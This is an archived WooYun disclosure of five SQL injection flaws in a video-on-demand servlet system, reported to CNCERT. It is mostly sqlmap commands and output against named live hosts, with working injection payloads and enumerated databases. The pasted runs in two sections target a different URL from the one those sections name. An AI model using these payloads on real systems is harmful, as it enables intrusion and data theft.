{"id": 36724, "wybug_id": "wooyun-2015-0101220", "wybug_title": "某视频点播系统通用SQL注射漏洞#五处打包", "wybug_corp": "国家互联网应急中心", "wybug_author": "term", "wybug_date": "2015-03-16 11:40", "wybug_open_date": "2015-06-18 11:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向公众公开  简要描述： RT 详细说明：  貌似第一次打开网站的时候会打不开,刷新下即可！第一处：vodsys.MovieInfor?id=\nhttp://www.donvieware.com:8085/servlet/vodsys.MovieInfor?id=950http://125.88.124.147:8085/servlet/vodsys.MovieInfor?id=1074http://121.10.252.178:8085/servlet/vodsys.MovieInfor?id=1014http://61.189.240.78:8085/servlet/vodsys.MovieInfor?id=2659\n\nC:\\sqlmap>sqlmap.py -u \"http://www.donvieware.com:8085/servlet/vodsys.MovieInfor?id=950\" --dbs --batch    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 20:02:27[20:02:27] [INFO] resuming back-end DBMS 'mysql'[20:02:27] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=950 AND 1932=1932    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: id=950 AND (SELECT 2526 FROM(SELECT COUNT(*),CONCAT(0x717a687271,(SELECT (CASE WHEN (2526=2526) THEN 1 ELSE 0 END)),0x7174657371,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (random number) - 24 columns    Payload: id=-5664 UNION ALL SELECT 7053,7053,7053,7053,CONCAT(0x717a687271,0x7767456c5578696a6757,0x7174657371),7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=950 AND SLEEP(5)---[20:02:28] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0[20:02:28] [INFO] fetching database names[20:02:28] [INFO] the SQL query used returns 44 entriesavailable databases [44]:[*] #mysql50#erms_jun.bak[*] #mysql50#erms_jun.ok[*] #mysql50#ermsb.bak[*] dlgk[*] dms[*] eduman1[*] eduman10[*] eduman2[*] erms[*] erms_jun[*] erms_wj[*] ermsb[*] ermsnew[*] ermst[*] gkdl[*] gkhx[*] gkls[*] gksw[*] gksx[*] gkwl[*] gkyw[*] gkyy[*] gkzz[*] information_schema[*] lab[*] laball[*] labb[*] labnew[*] mdvdoc[*] mdvread1[*] mdvread2[*] mysql[*] school1[*] school100[*] snkey[*] test[*] var[*] VodDb[*] WebtkDb[*] zkhx[*] zksx[*] zkwl[*] zkyw[*] zkyy[20:02:28] [INFO] fetched data logged to text files under 'C:\\sqlmap\\output\\www.donvieware.com'[*] shutting down at 20:02:28\n\nC:\\sqlmap>sqlmap.py -u \"http://www.donvieware.com:8085/servlet/vodsys.MovieInfor?id=950\" --current-user --current-db    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 20:03:28[20:03:28] [INFO] resuming back-end DBMS 'mysql'[20:03:28] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=950 AND 1932=1932    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: id=950 AND (SELECT 2526 FROM(SELECT COUNT(*),CONCAT(0x717a687271,(SELECT (CASE WHEN (2526=2526) THEN 1 ELSE 0 END)),0x7174657371,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (random number) - 24 columns    Payload: id=-5664 UNION ALL SELECT 7053,7053,7053,7053,CONCAT(0x717a687271,0x7767456c5578696a6757,0x7174657371),7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=950 AND SLEEP(5)---[20:03:29] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0[20:03:29] [INFO] fetching current usercurrent user:    'root@localhost'[20:03:29] [INFO] fetching current databasecurrent database:    'VodDb'[20:03:29] [INFO] fetched data logged to text files under 'C:\\sqlmap\\output\\www.donvieware.com'[*] shutting down at 20:03:29\n\n\n\n\n第二处：vodsys.bulletinadmin.BulletinInfor?id=\nhttp://61.189.240.78:8085/servlet/vodsys.bulletinadmin.BulletinInfor?id=113http://www.donvieware.com:8085/servlet/vodsys.bulletinadmin.BulletinInfor?id=104http://125.88.124.147:8085/servlet/vodsys.bulletinadmin.BulletinInfor?id=2http://121.10.252.178:8085/servlet/vodsys.bulletinadmin.BulletinInfor?id=104\n\nC:\\sqlmap>sqlmap.py -u \"http://www.donvieware.com:8085/servlet/vodsys.MovieInfor?id=950\" --current-user --current-db    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 20:03:28[20:03:28] [INFO] resuming back-end DBMS 'mysql'[20:03:28] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=950 AND 1932=1932    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: id=950 AND (SELECT 2526 FROM(SELECT COUNT(*),CONCAT(0x717a687271,(SELECT (CASE WHEN (2526=2526) THEN 1 ELSE 0 END)),0x7174657371,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (random number) - 24 columns    Payload: id=-5664 UNION ALL SELECT 7053,7053,7053,7053,CONCAT(0x717a687271,0x7767456c5578696a6757,0x7174657371),7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=950 AND SLEEP(5)---[20:03:29] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0[20:03:29] [INFO] fetching current usercurrent user:    'root@localhost'[20:03:29] [INFO] fetching current databasecurrent database:    'VodDb'[20:03:29] [INFO] fetched data logged to text files under 'C:\\sqlmap\\output\\www.donvieware.com'[*] shutting down at 20:03:29C:\\sqlmap>sqlmap.py -u \"http://www.donvieware.com:8085/servlet/vodsys.MovieInfor?id=950\" --dbs --batch    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 20:05:30[20:05:30] [INFO] resuming back-end DBMS 'mysql'[20:05:30] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=950 AND 1932=1932    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: id=950 AND (SELECT 2526 FROM(SELECT COUNT(*),CONCAT(0x717a687271,(SELECT (CASE WHEN (2526=2526) THEN 1 ELSE 0 END)),0x7174657371,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (random number) - 24 columns    Payload: id=-5664 UNION ALL SELECT 7053,7053,7053,7053,CONCAT(0x717a687271,0x7767456c5578696a6757,0x7174657371),7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=950 AND SLEEP(5)---[20:05:31] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0[20:05:31] [INFO] fetching database names[20:05:31] [INFO] the SQL query used returns 44 entriesavailable databases [44]:[*] #mysql50#erms_jun.bak[*] #mysql50#erms_jun.ok[*] #mysql50#ermsb.bak[*] dlgk[*] dms[*] eduman1[*] eduman10[*] eduman2[*] erms[*] erms_jun[*] erms_wj[*] ermsb[*] ermsnew[*] ermst[*] gkdl[*] gkhx[*] gkls[*] gksw[*] gksx[*] gkwl[*] gkyw[*] gkyy[*] gkzz[*] information_schema[*] lab[*] laball[*] labb[*] labnew[*] mdvdoc[*] mdvread1[*] mdvread2[*] mysql[*] school1[*] school100[*] snkey[*] test[*] var[*] VodDb[*] WebtkDb[*] zkhx[*] zksx[*] zkwl[*] zkyw[*] zkyy[20:05:31] [INFO] fetched data logged to text files under 'C:\\sqlmap\\output\\www.donvieware.com'[*] shutting down at 20:05:31\n第三处：filmid参数\n注入点在视频播放那里,filmid参数存在注入，盲注！http://121.10.252.178:8085/servlet/vodsys.filmplay?filmid=553&fileid=2087http://125.88.124.147:8085/servlet/vodsys.filmplay?filmid=2650&fileid=4331http://61.189.240.78:8085/servlet/vodsys.filmplay?filmid=2958&fileid=5292http://www.donvieware.com:8085/servlet/vodsys.filmplay?filmid=3834&fileid=5793\n\nC:\\sqlmap>sqlmap.py -u \"http://121.10.252.178:8085/servlet/vodsys.filmplay?filmid=553&fileid=2087\" --dbs --batch    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 20:07:04[20:07:04] [INFO] resuming back-end DBMS 'mysql'[20:07:04] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: filmid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: filmid=553 AND 9408=9408&fileid=2087---[20:07:13] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5[20:07:13] [INFO] fetching database names[20:07:13] [INFO] fetching number of databases[20:07:13] [INFO] resumed: 22[20:07:13] [INFO] resumed: information_schema[20:07:13] [INFO] resumed: VodDb[20:07:13] [INFO] resumed: WebtkDb[20:07:13] [INFO] resumed: erms[20:07:13] [INFO] resumed: gkdl[20:07:13] [INFO] resumed: gkhx[20:07:13] [INFO] resumed: gkls[20:07:13] [INFO] resumed: gksw[20:07:13] [INFO] resumed: gksx[20:07:13] [INFO] resumed: gkwl[20:07:13] [INFO] resumed: gkyw[20:07:13] [INFO] resumed: gkyy[20:07:13] [INFO] resumed: gkzz[20:07:13] [INFO] resumed: lab[20:07:13] [INFO] resumed: mdvread1[20:07:13] [INFO] resumed: mysql[20:07:13] [INFO] resumed: test[20:07:13] [INFO] resumed: zkhx[20:07:13] [INFO] resumed: zksx[20:07:13] [INFO] resumed: zkwl[20:07:13] [INFO] resumed: zkyw[20:07:13] [INFO] resumed: zkyyavailable databases [22]:[*] erms[*] gkdl[*] gkhx[*] gkls[*] gksw[*] gksx[*] gkwl[*] gkyw[*] gkyy[*] gkzz[*] information_schema[*] lab[*] mdvread1[*] mysql[*] test[*] VodDb[*] WebtkDb[*] zkhx[*] zksx[*] zkwl[*] zkyw[*] zkyy[20:07:13] [INFO] fetched data logged to text files under 'C:\\sqlmap\\output\\121.10.252.178'[*] shutting down at 20:07:13\n\n\n第四处：vodsys.CommendAdd?id=\n这个注入点在发表评论处！http://121.10.252.178:8085/servlet/vodsys.CommendAdd?id=93http://61.189.240.78:8085/servlet/vodsys.CommendAdd?id=2659http://www.donvieware.com:8085/servlet/vodsys.CommendAdd?id=950http://125.88.124.147:8085/servlet/vodsys.CommendAdd?id=1008\n\nC:\\sqlmap>sqlmap.py -u \"http://www.donvieware.com:8085/servlet/vodsys.MovieInfor?id=950\" --dbs --batch    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 20:08:46[20:08:46] [INFO] resuming back-end DBMS 'mysql'[20:08:46] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=950 AND 1932=1932    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: id=950 AND (SELECT 2526 FROM(SELECT COUNT(*),CONCAT(0x717a687271,(SELECT (CASE WHEN (2526=2526) THEN 1 ELSE 0 END)),0x7174657371,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (random number) - 24 columns    Payload: id=-5664 UNION ALL SELECT 7053,7053,7053,7053,CONCAT(0x717a687271,0x7767456c5578696a6757,0x7174657371),7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053,7053#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: id=950 AND SLEEP(5)---[20:08:46] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0[20:08:46] [INFO] fetching database names[20:08:46] [INFO] the SQL query used returns 44 entriesavailable databases [44]:[*] #mysql50#erms_jun.bak[*] #mysql50#erms_jun.ok[*] #mysql50#ermsb.bak[*] dlgk[*] dms[*] eduman1[*] eduman10[*] eduman2[*] erms[*] erms_jun[*] erms_wj[*] ermsb[*] ermsnew[*] ermst[*] gkdl[*] gkhx[*] gkls[*] gksw[*] gksx[*] gkwl[*] gkyw[*] gkyy[*] gkzz[*] information_schema[*] lab[*] laball[*] labb[*] labnew[*] mdvdoc[*] mdvread1[*] mdvread2[*] mysql[*] school1[*] school100[*] snkey[*] test[*] var[*] VodDb[*] WebtkDb[*] zkhx[*] zksx[*] zkwl[*] zkyw[*] zkyy[20:08:46] [INFO] fetched data logged to text files under 'C:\\sqlmap\\output\\www.donvieware.com'[*] shutting down at 20:08:46\n第五处：userID参数\n这处注入出在用户注册页面,userID参数存在POST注入,盲注！http://www.donvieware.com:8085/servlet/vodsys.userregisterhttp://125.88.124.147:8085/servlet/vodsys.userregisterhttp://121.10.252.178:8085/servlet/vodsys.userregisterhttp://61.189.240.78:8085/servlet/vodsys.userregister\n\n\n\n\n\n\n\nPOST parameter 'userID' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Nsqlmap identified the following injection points with a total of 102 HTTP(s) requests:---Place: POSTParameter: userID    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: userID=abb123' AND SLEEP(5) AND 'vYzX'='vYzX&pwd=abb123&pwdagain=abb123&name=%CE%DA%D4%C6&sex=1&mail=123456789@qq.com&phone=&mobile=&address=&pwdquestion=%CE%D2%CA%C7%CB%AD%A3%BF&pwdanswer=%CE%DA%D4%C6&Submit=%D7%A2%B2%E1---[20:14:30] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11[20:14:30] [INFO] fetched data logged to text files under 'C:\\sqlmap\\output\\www.donvieware.com'[*] shutting down at 20:14:30\n   漏洞证明：  \n\n\n\n   修复方案：  你们更专业！   版权声明：转载请注明来源 term@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-03-20 11:46 厂商回复： CNVD确认所述情况，已经由CNVD通过网站公开联系方式（或以往建立的处置渠道）向网站管理单位（软件生产厂商）通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-24 09:47 |    \t\tHero \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:31        | 药药切克闹,充气娃娃迷幻药)\t\t \n  五处是多少钱？    \n     2015-08-24 09:54 |    \t\tterm \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:21        )\t\t \n  @Hero 500 单个发的话 200一个    \n     2015-08-24 10:27 |    \t\tHero \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:31        | 药药切克闹,充气娃娃迷幻药)\t\t \n  @term 这么说是一处100打包几个算几百？    \n     2015-08-24 11:52 |    \t\tterm \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:21        )\t\t \n  @Hero 是啊 这个是低质量漏洞 而且案例少 其他的我就不清楚了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}